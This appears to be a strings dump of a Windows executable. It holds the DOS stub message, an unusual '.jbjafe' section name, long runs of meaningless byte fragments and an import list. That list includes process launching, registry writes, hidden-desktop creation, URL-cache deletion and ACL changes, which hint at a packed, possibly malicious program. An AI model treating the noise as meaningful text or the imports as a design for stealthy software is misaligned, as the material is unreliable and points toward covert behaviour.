!This program cannot be run in DOS mode.
.text
.bss
.data
.idata
.jbjafe
g8T2#hS23hK0e
'L?FRL[
2+hS2/@
W2"D
o	%L
c	%L
yo	%L
qg	%L
S4k:
7S4k:
\1F4
}k&[~b\
g&PQ
yK	%L
?0BL[
`[h=8kh[
iO	%L
+M[Qh:[
${)'L
F7$S
fL[:
~0"[
9SQ\5[
{&[F
Qp5[
gL[Rn
g&[F
{&[F
L[Fb8
fL.@^	
fL.@^
9[M[
=bM[F
:1s{
5,L[N
FL[Q
[Q0<[
/L[8Z0
g8\:B4
"@T=
kF1D
qL[4"
LT=WM[
Jv-[
gL[0"
uL[N
L[2"@b<
[2"D
WHT<
gL[0
%L[Q
9YRu
W1_:
'$['&L
U	L[0"
9[M[
g&[4"
LT<XD[
FgL/
FfL[
FgL/
FfL[
g8Q~
Y%L3
FfL[
FgL.
gL[0
bL[0
OcL[4
cF0l
&EgC
cL[:
gL=~
gL[0"
cL[4
cF0t
&Eg8pP
?L[N
dL[0
eL[:
eL[8
VfL[:
hfL[
gL[J
gLRyh
T<pM[
igL[:
FfL[
kF1D
kF1D
2{L[N
eL[Q
gL[2"
L3WC
g&[QH)[
iC&&L[0
iS)'L[~b
gL[0
eL[FC
AfIc&&L
eL[9jT
eL[Ob
AC&&LK
AC&&L_Ph
IC&&LS
IC&&LZ
AC&&LZ~b
AC&&LY~b
Ic&&L
AC&&L
PfM[
yeM^
Ic&&LXP
rfL[9jT
yFbt
NCL[9jT
fL[8
[ObT
:gL[9
IS)'LYRZ
&Cc9
$&LT
&Bg9\:bD
^IW)'L)b
^IW)'L)b
8L[0
M'L[
gL[0
gL[J
Q7$[
'+L[F
e:L[Fb8
>Mg}
g&Z4"
pL[Fb8
9S2:@
crfFgL[
PMfFgL[
PNfFgL[
POfFgL[
PHfFgL[
Xe1st
srb{h
sZb{
Hrid	
gL[RGC
^9[J
gL[9[rY
Y9[JY
g9t:
Hrif
	K4#O^
0sIZ
9[JZ
f9h0
=L[22\
tIZC
_0cYZ
kfPgL[
X\1sJ
_)'Lb
HE4#SZ2g
4#RZ22
dQ_)'L
0cqZ
YFSY
BL[Q
Fg8H
>L[2
]?L[2
?L[0
5gL[
g>T0
zg\[
[IgL-
gM[2
FgLb<
0L[P'O[
{dX^
gL[0
Y2sY{('L
1L[0
fL[2
g8T9
gL[:
9_L.
X9_L.
^9_L/
g9M2cyZ
K[9[qZ
g9E9[qX
g9Q9[q^
gL[J
gL[J
M3dC
9]9"
&Gv>
$MfygL[
Cc8Q:
Ab9_9"
g9_9"
CT;1
Y+L[N
3FgL[
M6L[0
U9[r
GL[Qt
H3o8
a}+0
5L[0
	W:GL
N}'[
1WRd
y6L[
>L[N
gL[y
R6&Y
fL.@
L39gL[
Q7L[
Y(L[
g$`Y%L
4L[:
J=~"
&Ge9_:
[22DT
2"@T
YoRL
g_xR
<P\]
&Bg9]
3cRg
cRf[gL[
1w&S
J=F"
ZL[N
jLXy6
eL[4"
T=xN[
Y2sq
YFSq
g}K0
*L[0"
*L[2
crL[N
g}K:"
[0kv
.L[0"
m,L[
F[D-r
/L[F
gL[9
4$7f%L3
eL[9
1L[Fb8
L[4"
.L[0
gL[:
E7&[
1/L[
l%L[
cjy'
uEL[FR
Y:f%L
YL.{n
m9B2"\
gLjy8
!w.A
=!L[:
X=F"
gN[Q
gLRb
&L[2"D
fL.@
MWL[
"L[:
Q,	[
gL[ 
Cb1xQ
U#L[:
u#L[
a#L[:
-#L[
gL[ 
Cb1xQ0
#L[:
C$If%L
F7$zf%L
gL[ 
Cb1H
A$L[:
gL[ 
Cb1xQ
5$L[:
gL[ 
Cb1H
%L[:
gL[ 
Cb1H
%L[:
gL[ 
gL[ 
&L[:
F7$?g%L
fL[9
LT=,M[
{I[qgLb<
9[M[
k+L[N
F7$?g%L
SQTs[
y\L[0
XL[:
yYL[
YL[:
F0$ef%L
QDr[
KQdr[
aZL[
}w$rg%L
}o$Gg%L
}o$Ag%L
}o$[g%L
Q<p[
SQpp[
~wk[
[L[:
U\L[
Qlp[
A\L[:
gL[ 
Cb1xQ
\L[:
}o&[
=_L[
UoM[
d%L3
e%L3R
dL[9
[2"D
gL[0
Q,{[
S43N^
QP{[
YQL[22D
QXu[
e%L3
PlN[
1_L[Q
Q`t[
gL[~
Fg8G
F7&[
QSL[
HgL[F
Nd\[
F7$.e%L
RL[0
SL[9
F[I)qn
Fg8Q
g9u:
TL[0
!TL[0
5TL[0
VL[F
_5L[F
4#\X
A7&[
?L[N
xL[Q<|[
k{.0
wL[~
*gL[0
gLjy'
F'S[
Q(c[
GL[Q
WkS[
WL[0
SL[:
aTL[:
5TL[
gL[ 
Cb1O
gL[ 
Cb1O
gL[ 
iUL[:
w$If%L
F7$zf%L
gL[ 
Cb1O
gL[ 
Cb1O
Q0~[
SQt~[
gL[ 
AVL[:
UL[:
eVL[:
qVL[:
=VL[
VL[:
]WL[:
76L[N
QdL[ 
9WL[:
WL[:
MHL[
}o&[
~0E[
e%L3
ML[8
IL[Q
gL[:
F7&[Q
NL[8
[Qlg[
W3QdL[Q4f[
g$[IgL
ML[0
f$1e%L
FgLT=
QHe[
g$Pe%L
ENL[
aKL[:
Q<d[
V%p[
QXj[
!OL[4"
@L[2"
wL[Q
8|/D:
Rk&Y
G7$]e%L
ML[4"
ML[:
gL=F"
0&kFR
0&kFR
0&kFR`
0&kFRP
[Qtd[
[Qdd[
y@L[
	@L[
[Q@k[
g$-?'L1E
[Qdk[
g$-?'L1E
AAL[
g$-?'L1E
yw&&L
mAL[
g$-?'L1E
yG,'L
g$-?'L1E
ys&&L
9AL[
g$-?'L1E
y{&&L
[Q$j[
g$-?'L1E
AL[0
L[97$
f%L3X
yo&&L1
7&g2"
eBL[
yo&&L1
&L3)fL[2"
!BL[
o&OQ
1&kFRH
yo&&L1
yo&&L1
ICL[
\3hfL[
g&[Q
g&[FRx
g&[FR
b%L1
O&&L1
yo&&L1
g$.c%L1
g&[Q
O[97$
f%L3<
g&[Q<o[
yo&&L1
b%L1
yo&&L1
c%L3c
g&[Q
g&[FRx
g&[FR,
g$Zc%L3
eL[QHn[
g&[FRx
g&[FR,
g$Zc%L3
eL[Q
g$Zc%L3
eL[Q
g&[FRx
g&[FR
`%L1
YGL[0
yo&&L1
b%L3
eL[Q
g&[FRx
L[97$
`%L3c
&[FRx
g&[FR
E[97$
f%L3c
GL[0
g&[FRx
g&[FR,
yxL[
$!c%L1
xL[9Z
[Q$S[
fL[FR
yo&&L1
yo&&L1
O[97$
f%L3<
\38gL[
g&[Q
g&[FRx
g&[FR
gL3zgL[
b%L1
k &L
g&[Q
g&[FRx
g&[FR
b%L1
yo&&L1
`%L3c
L[97$
f%L3
s&&L1
yo&&L1
u{L[
[3"gL[
g&[Q
}L[0
fL[9
*&[F
UcM[
z2L[
QLT[
&Fc9J
&Fa9J
pL[9
&Fk9J
&Fi9J
F7$['&L
L[4;JZ
-}L[
urL[9
!rL[0
rL[9
rL[8
rL[9
IsL[9
sL[0
%sL[9
zeL[P
Q`T[
gL3)
CR$$[
QhY[
}w&[4
FT?IM[
QH^[
QHX[
9qL[:
g&[Q<_[
	%L1
vL[Q$][
	sL[
9sL[
j*.K
wL[4
Ql][
hL[8
a%L3)
a%L3)
gL[J
a%L3)
'$['&L
)hL[0"
9[M[
mhL[
9[M[
Q<C[
4b#&
g&[Q
gL[8
qgL[
g&[FRx
gL[Q
kL[4
g&[Q
g&ZFRL
g3U:
gLT=
vgL[
QkL[
V&Z2
F7&[
DL[:B(
:`L[FR$
"DT<9K[
AkL[P5K[
`L[2"X
A3	w\[F
a%L1
[Q8F[
fL.@
kL[:
\3FgL[4
Aw8{
mL[FRP
Fg9{
nL[FR
CdL[0
QhG[
Fg9{
]oL[FR`
+dL[0
Fg9{
oL[FRd
dL[4
g&[Q D[
ys&&L
M`L[P
[RZC
oL[FRd
eL[9
F[O)
y{&&L
`L[9
g&[Q
y{&&L
`L[PZN[
[RZC
`L[FRl
GfL[9
F7$va%L
-bL[9Z<
Ak 'L
fL.@
F7&Y
	bL[4
=bL[
g&[F
HL[F
g$"a%L3
fL[9
2"@f
gwn=
$&L.
9cL[0
\yw&&L.
yG,'L
g9PFRd
g9O9Z<
g9O9Z<
IdL[
gwn9
g9]2zh
g9]2z4
g9]2zP
gL[FBD
gL[FB@
gL[FB\
gL[FBX
gL[FBl
gL[FB`
gL[FB|
gL[FBx
9Xn.
bL[:
9Xl/C
wL[<chf
XgL[23hS
2#hS/
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB,
gL[FB(
gL[FB$
gL[FB 
gL[FB<
gL[FB8
gL[FB4
gL[FB0
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FBL
gL[FBH
gL[FBD
gL[FB@
gL[FB\
gL[FBX
gL[FBT
gL[FBP
gL[FBl
gL[FBh
gL[FBd
gL[FB`
gL[FB|
gL[FBx
gL[FBt
gL[FBp
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB,
gL[FB(
gL[FB<
gL[FB8
gL[FB4
gL[FB0
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
gL[FB
sxrq
s-;<
s-;<
sxri
59c'&
%9$g
[-=m
OO2w
%9$gO
%9$cO
%9$kM
q`PL
tiw 
b``D
tS;<o
\%s4
lui]
%OD[e
%ODWe
%ODSe
%ODOe
%ODKe
%ODGe
%ODCe
%ODwe
%ODse
%ODoe
%ODke
%ODge
%ODce
{GO4
{GO4
%,P4&m
O4:_
CoCreateInstance
CLSIDFromString
CoInitialize
CoUninitialize
SysAllocString
DeleteUrlCacheEntry
FindFirstUrlCacheEntryA
FindNextUrlCacheEntryA
ExitProcess
ExpandEnvironmentStringsA
GetCommandLineA
GetComputerNameA
GetCurrentProcessId
GetCurrentThreadId
GetExitCodeThread
GetFileSize
GetModuleFileNameA
GetModuleHandleA
CloseHandle
GetProcAddress
GetSystemDirectoryA
GetTempPathA
GetTickCount
GetVersion
GetVersionExA
GetWindowsDirectoryA
GlobalMemoryStatus
CopyFileA
InterlockedIncrement
IsBadReadPtr
IsBadWritePtr
LoadLibraryA
LocalAlloc
LocalFree
OpenMutexA
CreateFileA
ReadFile
RtlUnwind
SetFilePointer
CreateMutexA
Sleep
TerminateProcess
VirtualQuery
CreateProcessA
WaitForSingleObject
WideCharToMultiByte
WinExec
WriteFile
lstrlenA
lstrlenW
CreateThread
DeleteFileA
GetWindowTextA
GetWindowRect
FindWindowA
GetWindow
GetClassNameA
SetFocus
GetForegroundWindow
LoadCursorA
LoadIconA
SetTimer
RegisterClassA
MessageBoxA
GetMessageA
GetWindowLongA
SetWindowLongA
CreateDesktopA
SetThreadDesktop
GetThreadDesktop
TranslateMessage
DispatchMessageA
SendMessageA
PostQuitMessage
ShowWindow
CreateWindowExA
DestroyWindow
MoveWindow
DefWindowProcA
CallWindowProcA
GetStockObject
SetBkColor
SetTextColor
CreateBrushIndirect
CreateFontA
GetUserNameA
RegCreateKeyExA
RegCloseKey
RegOpenKeyExA
RegQueryValueExA
RegSetValueExA
GetSecurityInfo
SetSecurityInfo
SetEntriesInAclA
__GetMainArgs
_sleep
_stricmp
atoi
exit
memcpy
memset
printf
raise
rand
signal
sprintf
srand
sscanf
strcat
strchr
strncmp
vsprintf
ole32.DLL
OLEAUT32.DLL
WININET.DLL
KERNEL32.DLL
USER32.DLL
GDI32.DLL
ADVAPI32.DLL
CRTDLL.DLL
